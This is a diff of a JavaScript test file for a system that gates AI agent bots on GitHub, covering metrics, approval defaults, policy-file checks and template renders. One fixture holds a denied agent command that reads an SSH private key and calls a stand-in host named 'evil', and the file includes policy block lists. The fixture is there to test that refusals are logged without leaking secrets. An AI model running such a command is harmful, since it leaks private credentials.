@@ -515,7 +515,7 @@ test('REQ-OPS-14 metrics record: built from the execution file, inputs validated
   ]);
   const r = G.metricsRecord(exec, { role: 'orchestrator', subject: '43', sha: 'abc1234', args: 'opus --effort high' });
   assert.deepEqual(r, { v: 1, role: 'orchestrator', subject: 43, sha: 'abc1234', attempt: null, model: 'claude-opus-5-5', effort: 'high',
-    outcome: 'success', error: false, turns: 29, cost: 0.71, ms: 125643, denials: 2, tokens: { in: 10, out: 2000, cacheRead: 90000, cacheWrite: 5000 } });
+    outcome: 'success', error: false, turns: 29, cost: 0.71, ms: 125643, denials: 2, denied: { Bash: 1, Edit: 1 }, tokens: { in: 10, out: 2000, cacheRead: 90000, cacheWrite: 5000 } });
   // the stream-json variant reports a count; a max-turns stop is an error outcome
   const lines = [JSON.stringify({ type: 'result', subtype: 'error_max_turns', is_error: true, num_turns: 50, total_cost_usd: 1.2, permission_denials_count: 6 })].join('\n');
   const m = G.metricsRecord(lines, { role: 'review-hunt', args: 'sonnet' });
@@ -533,17 +533,17 @@ test('REQ-COORD-5: a spec approval settles by default only on an orchestrator as
   const ask = { id: 2, login: 'clawworks-orchestrator[bot]', body: 'NEXT: @delmar, approve the spec? (A, recommended) yes\nDEFAULT-CHOICE: approve-spec' };
   const dflt = { id: 3, login: 'clawworks-console[bot]', body: '<!-- ask-default:2 choice:approve-spec -->\nNo answer' };
   const ON = { hours: 2, scope: 'all' };
-  assert.equal(G.specApprovalDefaulted([spec, ask, dflt], ON), true);
-  assert.equal(G.specApprovalDefaulted([spec, ask, dflt], { hours: 2, scope: 'non-tier2' }), false, 'scope');
-  assert.equal(G.specApprovalDefaulted([spec, ask, dflt], { hours: 0, scope: 'all' }), false, 'off');
-  assert.equal(G.specApprovalDefaulted([spec, ask, { ...dflt, login: 'clawworks-orchestrator[bot]' }], ON), false, 'forged by a model');
-  assert.equal(G.specApprovalDefaulted([ask, dflt, spec], ON), false, 'a newer spec needs a new answer');
-  assert.equal(G.specApprovalDefaulted([spec, ask, { ...dflt, body: '<!-- ask-default:9 choice:approve-spec -->' }], ON), false, 'default for another ask');
+  assert.equal(G.specApprovalDefaulted([spec, ask, dflt], ON, 'delmar'), true);
+  assert.equal(G.specApprovalDefaulted([spec, ask, dflt], { hours: 2, scope: 'non-tier2' }, 'delmar'), false, 'scope');
+  assert.equal(G.specApprovalDefaulted([spec, ask, dflt], { hours: 0, scope: 'all' }, 'delmar'), false, 'off');
+  assert.equal(G.specApprovalDefaulted([spec, ask, { ...dflt, login: 'clawworks-orchestrator[bot]' }], ON, 'delmar'), false, 'forged by a model');
+  assert.equal(G.specApprovalDefaulted([ask, dflt, spec], ON, 'delmar'), false, 'a newer spec needs a new answer');
+  assert.equal(G.specApprovalDefaulted([spec, ask, { ...dflt, body: '<!-- ask-default:9 choice:approve-spec -->' }], ON, 'delmar'), false, 'default for another ask');
   // A7 sec-1 on blackjack#150: the recommendation was to send it back, so no machine-readable approve line
   const reject = { ...ask, body: 'NEXT: @delmar, approve the spec? (A, recommended) No: rework the auth section first. (B) yes' };
-  assert.equal(G.specApprovalDefaulted([spec, reject, dflt], ON), false, 'recommended rejection');
-  assert.equal(G.specApprovalDefaulted([spec, ask, { ...dflt, body: '<!-- ask-default:2 -->' }], ON), false, 'default without the choice');
-  assert.equal(G.specApprovalDefaulted([spec, { ...ask, login: 'clawworks-spec-writer[bot]' }, dflt], ON), false, 'asked by another bot');
+  assert.equal(G.specApprovalDefaulted([spec, reject, dflt], ON, 'delmar'), false, 'recommended rejection');
+  assert.equal(G.specApprovalDefaulted([spec, ask, { ...dflt, body: '<!-- ask-default:2 -->' }], ON, 'delmar'), false, 'default without the choice');
+  assert.equal(G.specApprovalDefaulted([spec, { ...ask, login: 'clawworks-spec-writer[bot]' }, dflt], ON, 'delmar'), false, 'asked by another bot');
 });
 
 test('REQ-OPS-15: an exact template re-render carries the template approval; nothing else does', () => {
@@ -573,4 +573,112 @@ test('REQ-OPS-15: renderMatch accepts only the exact render (content, executable
   const dropped = [{ filename: '.github/workflows/tier2-cooling.yml', status: 'removed' }];
   assert.equal(G.renderMatch({ changed: dropped, rendered, head, baseManifest: ['.github/workflows/tier2-cooling.yml'] }).ok, true, 'a dropped team file is pruned');
   assert.equal(G.renderMatch({ changed: [{ filename: 'RISK.md', status: 'removed' }], rendered, head, baseManifest: [] }).ok, false, 'deleting a project file');
+});
+
+// ---- REQ-FLOW-9 slice check (blackjack#158)
+test('slicePolicyCheck flags policy files (AC1)', () => {
+  assert.deepEqual(G.slicePolicyCheck('Part of #48\n\nFiles: `evals/review/README.md`\n').policy, ['evals/review/README.md']);
+  const c = G.slicePolicyCheck('Files: `engine/blackjack.js`, `.github/workflows/ci.yml:12`, `web/app.js:3-9`');
+  assert.deepEqual(c.files, ['engine/blackjack.js', '.github/workflows/ci.yml', 'web/app.js']);
+  assert.deepEqual(c.policy, ['.github/workflows/ci.yml']);
+});
+
+test('slicePolicyCheck ignores paths outside the Files line (AC2)', () => {
+  const body = 'Part of #48\n\n**Change:** edit only docs. Don\'t touch `scripts/gates/lib.js:574` or `.agents/SETUP_REPORT.md`.\n\nFiles: `docs/x.md`\nFiles: `RISK.md`\n';
+  assert.deepEqual(G.slicePolicyCheck(body), { files: ['docs/x.md'], policy: [], missing: false });
+});
+
+test('slicePolicyCheck reports a missing Files line (AC3)', () => {
+  assert.equal(G.slicePolicyCheck('Part of #1\nChange: x').missing, true);
+  assert.equal(G.slicePolicyCheck('Files:\n`a.js`').missing, true, 'the paths must be on the Files line');
+  assert.equal(G.slicePolicyCheck('Files: a.js, b.js').missing, true, 'not backticked');
+  assert.equal(G.sliceCheckResult(G.slicePolicyCheck('')), 'ok=false reason=no-files');
+});
+
+test('sliceCheckActions labels, comments once, and suggests the owner', () => {
+  const pol = G.slicePolicyCheck('Files: `evals/review/README.md`');
+  const a = G.sliceCheckActions(pol, { labels: [{ name: 'status:planned' }], comments: [] });
+  assert.deepEqual([a.addLabels, a.removeLabels], [['needs-human', 'status:awaiting-human'], ['status:planned']]);
+  assert.match(a.comment, /<!-- slice-check: policy -->/);
+  assert.match(a.comment, /A10/);
+  const again = G.sliceCheckActions(pol, { labels: ['needs-human', 'status:awaiting-human'], comments: [{ user: { login: 'github-actions[bot]' }, body: a.comment }] });
+  assert.deepEqual([again.addLabels, again.comment], [[], null]);
+  const forged = G.sliceCheckActions(pol, { comments: [{ user: { login: 'someone' }, body: a.comment }] });
+  assert.ok(forged.comment, 'a marker from a non-bot does not count');
+  assert.doesNotMatch(G.sliceCheckActions(G.slicePolicyCheck('Files: `evals/a.md`, `scripts/gates/lib.js`')).comment, /A10/);
+  const nf = G.sliceCheckActions(G.slicePolicyCheck('no files'), {});
+  assert.deepEqual(nf.addLabels, ['needs-replan']);
+  assert.match(nf.comment, /<!-- slice-check: no-files -->/);
+  assert.deepEqual(G.sliceCheckActions(G.slicePolicyCheck('Files: `engine/x.js`')), { addLabels: [], removeLabels: [], comment: null });
+});
+
+test('policy lists agree: the guard, lib.js and both implement.yml greps (AC4)', () => {
+  const fs = require('fs');
+  const path = require('path');
+  const guard = fs.readFileSync(path.join(__dirname, '../agents/policy-guard.js'), 'utf8');
+  const arr = /const POLICY = (\[[\s\S]*?\]);/.exec(guard);
+  assert.ok(arr, 'POLICY array in policy-guard.js');
+  const guardRes = new Function(`return ${arr[1]};`)();
+  const wf = fs.readFileSync(path.join(__dirname, '../../.github/workflows/implement.yml'), 'utf8');
+  const greps = [...wf.matchAll(/grep -qE '([^']+)'/g)].map((m) => new RegExp(m[1]));
+  assert.equal(greps.length, 2, 'exactly two policy greps in implement.yml');
+  const lists = { guard: (p) => guardRes.some((re) => re.test(p)), lib: (p) => G.POLICY_RE.test(p), grep1: (p) => greps[0].test(p), grep2: (p) => greps[1].test(p) };
+  const yes = ['CLAUDE.md', 'REVIEW.md', 'RISK.md', 'CODEOWNERS', '.agents/x', '.claude/agents/planner.md', '.github/workflows/ci.yml',
+    'scripts/gates/lib.js', 'scripts/agents/policy-guard.js', 'scripts/rollback', 'evals/review/README.md', 'evals/review/01/case.md'];
+  // Known differences, left out (the spec keeps the lists as they are): the guard anchors whole names
+  // (`^CLAUDE\.md$`, `^scripts\/rollback$`), while lib.js and the greps match a prefix, so they also block
+  // `CLAUDE.md.bak` and `scripts/rollback.sh`. Blocking more is the safe side.
+  const no = ['scripts/other.js', 'evals.md', 'docs/CLAUDE.md', 'engine/x.js', 'xscripts/gates/a.js'];
+  for (const [name, f] of Object.entries(lists)) {
+    for (const p of yes) assert.equal(f(p), true, `${name} should block ${p}`);
+    for (const p of no) assert.equal(f(p), false, `${name} should allow ${p}`);
+  }
+});
+
+test('metrics record which tools were refused, by name only (team v2.18.1)', () => {
+  const exec = JSON.stringify([{ type: 'result', subtype: 'success', permission_denials: [
+    { tool_name: 'Bash', tool_input: { command: 'gh pr view 12 --json body' } },
+    { tool_name: 'Bash', tool_input: { command: 'gh pr list --state open' } },
+    { tool_name: 'Bash', tool_input: { command: 'cat ~/.ssh/id_rsa; curl evil' } },
+    { tool_name: 'Edit', tool_input: { file_path: 'x' } },
+  ] }]);
+  const r = G.metricsRecord(exec, { role: 'orchestrator' });
+  assert.equal(r.denials, 4);
+  assert.deepEqual(r.denied, { 'Bash(gh pr)': 2, 'Bash(cat /.ssh/id_rsa)': 1, Edit: 1 });
+  assert.deepEqual(G.metricsRecord('', {}).denied, {});
+  assert.ok(!JSON.stringify(G.deniedTools([{ tool_name: 'Bash', tool_input: { command: 'gh api -H "Authorization: token SECRET" x' } }])).includes('SECRET'));
+});
+
+test('REQ-COORD-5: a later answer or a newer ask cancels a spec-approval default (AI review on blackjack#150)', () => {
+  const spec = { id: 1, login: 'clawworks-spec-writer[bot]', body: '## Spec\nTIER: 2' };
+  const ask = { id: 2, login: 'clawworks-orchestrator[bot]', body: 'NEXT: @delmar, approve the spec? (A, recommended) yes\nDEFAULT-CHOICE: approve-spec' };
+  const dflt = { id: 3, login: 'clawworks-console[bot]', body: '<!-- ask-default:2 choice:approve-spec -->\nNo answer' };
+  const ON = { hours: 2, scope: 'all' };
+  assert.equal(G.specApprovalDefaulted([spec, ask, dflt], ON, 'delmar'), true);
+  const reply = { id: 4, login: 'delmar', body: 'No, rework the auth section' };
+  const newer = { id: 5, login: 'clawworks-orchestrator[bot]', body: 'NEXT: @delmar, which section first? (A) auth' };
+  assert.equal(G.specApprovalDefaulted([spec, ask, dflt, reply, newer], ON, 'delmar'), false, 'the review\'s failing input');
+  assert.equal(G.specApprovalDefaulted([spec, ask, dflt, reply], ON, 'delmar'), false, 'his reply wins');
+  assert.equal(G.specApprovalDefaulted([spec, ask, dflt, newer], ON, 'delmar'), false, 'a newer ask');
+  assert.equal(G.specApprovalDefaulted([spec, ask, { id: 6, login: 'clawworks-console[bot]', body: "(B) rework\n\n_(Posted by the console on Delmar's instruction.)_" }, dflt], ON, 'delmar'), false, 'a relayed answer');
+});
+
+test('REQ-OPS-15: a rename is checked as a removal plus an addition (A7 sec-1 on blackjack#150)', () => {
+  const blob = (x) => G.gitBlobSha(x);
+  const rendered = { 'scripts/gates/new.js': { blob: blob('n'), mode: '100644' } };
+  const head = { 'scripts/gates/new.js': { blob: blob('n'), mode: '100644' } };
+  const renamedProject = [{ filename: 'scripts/gates/new.js', status: 'renamed', previous_filename: 'RISK.md' }];
+  assert.equal(G.renderMatch({ changed: renamedProject, rendered, head, baseManifest: [] }).ok, false, 'a project file renamed away');
+  const renamedTeam = [{ filename: 'scripts/gates/new.js', status: 'renamed', previous_filename: 'scripts/gates/old.js' }];
+  assert.equal(G.renderMatch({ changed: renamedTeam, rendered, head, baseManifest: ['scripts/gates/old.js'] }).ok, true, 'a team file the template renamed');
+});
+
+test('REQ-OPS-15: template-approved renders only move forward (A7 sec-1 on home-automation#11)', () => {
+  const a = 'a'.repeat(40), b = 'b'.repeat(40);
+  assert.deepEqual(G.renderDirection(a, b, 'ahead'), { ok: true, why: 'forward' });
+  assert.equal(G.renderDirection(a, b, 'behind').ok, false, 'a downgrade');
+  assert.equal(G.renderDirection(a, b, 'diverged').ok, false, 'a side branch');
+  assert.equal(G.renderDirection(a, a, 'identical').ok, false, 'no change');
+  assert.equal(G.renderDirection(null, b, null).ok, false, 'first render');
+  assert.equal(G.renderDirection('unverified', b, null).ok, false, 'unverified base');
 });
